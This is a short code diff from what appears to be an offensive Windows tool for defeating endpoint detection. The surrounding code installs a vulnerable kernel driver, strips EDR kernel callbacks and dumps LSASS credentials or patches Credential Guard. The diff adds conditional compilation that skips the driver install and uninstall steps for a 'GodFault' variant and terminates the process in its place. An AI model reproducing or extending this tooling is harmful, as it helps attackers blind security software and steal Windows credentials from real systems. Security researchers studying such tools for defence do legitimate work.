@@ -399,6 +399,7 @@ Other options:\n\
             PrintNtoskrnlOffsets();
         }
 
+#if VULN_DRIVER != GodFault
         // Install the vulnerable driver to have read / write in Kernel memory.
         LPTSTR serviceNameIfAny = NULL;
         BOOL isDriverAlreadyRunning = IsDriverServiceRunning(driverPath, &serviceNameIfAny);
@@ -426,6 +427,7 @@ Other options:\n\
             Sleep(5000);// TODO : replace by a reliable method to check if the driver is ready
             _putts_or_not(TEXT("\n"));
         }
+#endif
 
         // Checks if any EDR callbacks are configured. If no EDR callbacks are found, then dump LSASS / exec cmd / patch CredGuard. Ohterwise, remove the EDR callbacks and start a new (unmonitored) process executing itself to dump LSASS.
         _putts_or_not(TEXT("[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations..."));
@@ -718,6 +720,7 @@ Other options:\n\
         }
     }
 
+#if VULN_DRIVER != GodFault
     if (kernelMode && removeVulnDriver) {
         // Sleep(5000); // TODO : replace by a reliable method to check if the driver is ready
         _putts_or_not(TEXT("[*] Uninstalling vulnerable driver..."));
@@ -732,6 +735,9 @@ Other options:\n\
             _putts_or_not(TEXT("[+] The vulnerable driver was successfully uninstalled!"));
         }
     }
+#else
+    TerminateProcess(GetCurrentProcess(), 0);
+#endif
 
     return lpExitCode;
 }
